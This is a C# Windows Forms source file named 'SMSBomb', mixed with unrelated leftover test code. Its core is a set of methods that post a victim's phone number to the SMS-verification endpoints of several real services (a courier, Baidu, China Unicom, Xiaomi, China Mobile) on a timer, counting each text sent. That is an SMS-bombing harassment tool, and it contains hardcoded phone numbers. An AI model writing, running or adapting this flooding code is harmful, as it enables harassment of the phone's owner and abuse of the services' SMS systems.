using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace SMSBomb
{
    /// <summary>
    /// u9 dto
    /// </summary>
    public class U9Dto
    {
        /// <summary>
        /// 料号
        /// </summary>
        public string product_code { set; get; }
        /// <summary>
        /// 名称
        /// </summary>
        public string product_name { set; get; }
        /// <summary>
        /// 产品型号名称
        /// </summary>
        public string product_model { set; get; }
        /// <summary>
        /// U9上次更新时间
        /// </summary>
        public string LastUpdateDate { set; get; }
        /// <summary>
        /// 是否已同步
        /// </summary>
        public bool? IsHasSync { set; get; }
        /// <summary>
        /// 是否存在更新
        /// </summary>
        public bool? IsExistUpdate { set; get; }
    }
    public partial class Form1 : Form
    {
        private int SendCount = 0;
        private string mobile = string.Empty;
        private string LogConfig = @"D:\SyncBranchLog.log";
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Interval = 10000;
            //Guid? g = null;
            //var str = g?.ToString() + "3333" + "44444";
            //MessageBox.Show(str);
            //var testStr = "{\"U9MessageNO\":\"CSI:CSC001:2018-12-08日16-41-07:943\",\"JsonNO\":\"\",\"TransCode\":\"CSC001\",\"TranTime\":\"16:41\",\"RetCode\":\"200\",\"RetMsg\":\"成功!\",\"PageCount\":1,\"CurrPage\":1,\"JsonStr\":\"[{\\\"product_id\\\":\\\"1001809243238754\\\",\\\"rownum\\\":\\\"1\\\",\\\"product_code\\\":\\\"1260400061\\\",\\\"product_name\\\":\\\"冷柜 BE1-260-A00A1-AA1A0-HM91 Y09 A02 中国 8E8003\\\",\\\"product_model\\\":\\\"BC/BD-260EG2和谐金\\\",\\\"LastUpdateDate\\\":\\\"2018-05-08\\\"}]\"}";
            //var json = JObject.Parse(testStr);
            //var productmodelList = json["JsonStr"];
            //var dtoList = JsonConvert.DeserializeObject<List<U9Dto>>(productmodelList.ToString());
            //try
            //{
            //    string str = null;
            //    if (str.Equals(null))//str 为null 报错！
            //    {
            //        MessageBox.Show("null");
            //    }
            //    else
            //    {
            //        MessageBox.Show("not null");
            //    }
            //}
            //catch (Exception ex)
            //{
            //    Console.WriteLine(ex.ToString());
            //}
            //var ja = new JArray();
            //ja.Add("Name");
            //ja.Add("Name2");
            //var result = new JObject();
            //result.Add("ModelNames",ja);
            //var xml = XML_Json_Helper.Json2XML(result.ToString());

            var list = new List<Peopele>();
            for (int i = 0; i <= 1; i++)
            {
                var p = new Peopele();
                p.Name = i.ToString();
                p.Age = 25 + i;
                p.IsTest = false;
                list.Add(p);
            }
            foreach (var l in list)
            {
                MessageBox.Show(l.Age.ToString());
            }
            list.Where(l => l.Age == 25).ToList().ForEach(k => k.Name = "我的年龄是25岁");
            list.ForEach(xx => xx.Age = 324);
            foreach (var l in list)
            {
                MessageBox.Show(l.Age.ToString());
            }
            var x = list.Select(l => new {x= l.Name, y=l.Age }).ToList();
        }
        public void WriteLog(string content)
        {
            StreamWriter sw = File.AppendText(LogConfig);
            sw.WriteLine(content);
            sw.Close();
        }
        //中通快递
        private bool SendMessage_ZT()
        {
            var jo = new JObject();
            jo.Add("mobile", mobile);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/json; charset=UTF-8");
            var res = wc.UploadString("https://hdgateway.zto.com/auth_account_sendLoginOrRegisterSmsVerifyCode", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_BD()
        {
            var jo = new JObject();
            jo.Add("owner_phone", mobile);
            jo.Add("type", 1);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded");
            var res = wc.UploadString("https://xiongzhang.baidu.com/account/register/sendsms?ajax=1&bdstoken=05b1ce4ca33e79ab9eb212d44312740f", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        /// <summary>
        /// 只适用于联通手机
        /// </summary>
        /// <returns></returns>
        private bool SendMessage_LT()
        {
            var stamp = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000;
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            var res = wc.UploadString("https://uac.10010.com/portal/Service/SendMSG?req_time=" + stamp + "&mobile=" + mobile + "&_=" + stamp, "GET");
            var resObj = JObject.Parse(res);
            if (resObj["resultCode"].ToString() == "0000")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_XM()
        {
            var stamp = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000;
            var jo = new JObject();
            jo.Add("sid", "passport");
            jo.Add("user", mobile);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/json; charset=UTF-8");
            var res = wc.UploadString("https://account.xiaomi.com/pass/sendServiceLoginTicket?_dc=" + stamp, "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_YD()
        {
            var jo = new JObject();
            jo.Add("userName", "15836470842");
            jo.Add("type", "01");
            jo.Add("channelID", "12034");
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded; charset=UTF-8");
            var res = wc.UploadString("https://login.10086.cn/sendRandomCodeAction.action", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            //SendMessage_BD();
            //SendMessage_ZT();
            //SendMessage_LT();
            //SendMessage_YD();
            //SendMessage_XM();
            GetResult("http://api.super.com.cn/test/brands/branch/import/by/mongo/4D87CDD4-5296-456B-B22E-B08F0164040D");
        }
        private void CounterAndUpdate()
        {
            SendCount++;
            label2.Text = SendCount.ToString();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Text = "15090613628";
            //textBox1.Text = "18521565465";
            mobile = textBox1.Text.ToString();
        }
        public void GetResult(string url)
        {
            if (SendCount <= 75)
            {
                WebClient client = new WebClient();
                var result = Encoding.UTF8.GetString(client.DownloadData(url));
                WriteLog(result);
                CounterAndUpdate();
            }
            else
            {
                timer1.Enabled = false;
                MessageBox.Show("一百个网点导入完毕！");
            }
        }
    }
}
